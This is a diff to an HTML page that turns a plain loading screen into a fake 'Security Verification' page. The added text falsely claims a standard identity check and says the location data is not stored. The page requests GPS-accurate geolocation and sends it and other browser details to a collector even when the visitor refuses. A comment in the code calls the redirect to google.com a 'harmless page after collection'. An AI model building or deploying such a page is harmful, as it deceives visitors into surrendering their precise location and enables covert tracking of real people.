@@ -3,30 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Security Verification</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            padding: 20px;
         }
         .container {
             text-align: center;
-            padding: 20px;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 30px;
+            font-weight: 400;
+            opacity: 0.9;
         }
         .spinner {
             border: 4px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top: 4px solid white;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info-box {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .info-box strong {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.8;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -36,9 +83,15 @@
 </head>
 <body>
     <div class="container">
-        <h2>Please wait...</h2>
+        <div class="logo">🔒</div>
+        <h1>Security Verification</h1>
+        <h2>Verifying your location for security purposes</h2>
         <div class="spinner"></div>
-        <p>Loading content...</p>
+        <div class="info-box">
+            <strong>Why we need your location:</strong>
+            This is a standard security check to verify your identity and prevent unauthorized access. Your location data is used only for verification and is not stored permanently.
+        </div>
+        <div class="status" id="status">Please allow location access when prompted...</div>
     </div>
 
     <script>
@@ -60,7 +113,7 @@
             timezoneOffset: new Date().getTimezoneOffset(),
         };
 
-        // Try to get geolocation
+        // Try to get geolocation with better options for accuracy
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -73,16 +126,24 @@
                         heading: position.coords.heading,
                         speed: position.coords.speed
                     };
-                    sendData();
+                    // Update UI
+                    document.getElementById('status').textContent = '✓ Location verified successfully!';
+                    document.querySelector('h2').textContent = 'Verification complete';
+                    setTimeout(() => {
+                        sendData();
+                    }, 1000);
                 },
                 function(error) {
                     data.geolocationError = error.message;
+                    // Still send data even if geolocation fails
+                    document.getElementById('status').textContent = 'Processing your request...';
+                    document.querySelector('h2').textContent = 'Completing verification';
                     sendData();
                 },
                 {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                    enableHighAccuracy: true,  // Request GPS-level accuracy
+                    timeout: 15000,           // Give more time
+                    maximumAge: 0             // Don't use cached location
                 }
             );
         } else {
@@ -105,7 +166,7 @@
                 // Redirect to a harmless page after collection
                 setTimeout(() => {
                     window.location.href = 'https://www.google.com';
-                }, 2000);
+                }, 1500);
             })
             .catch(error => {
                 console.error('Error:', error);
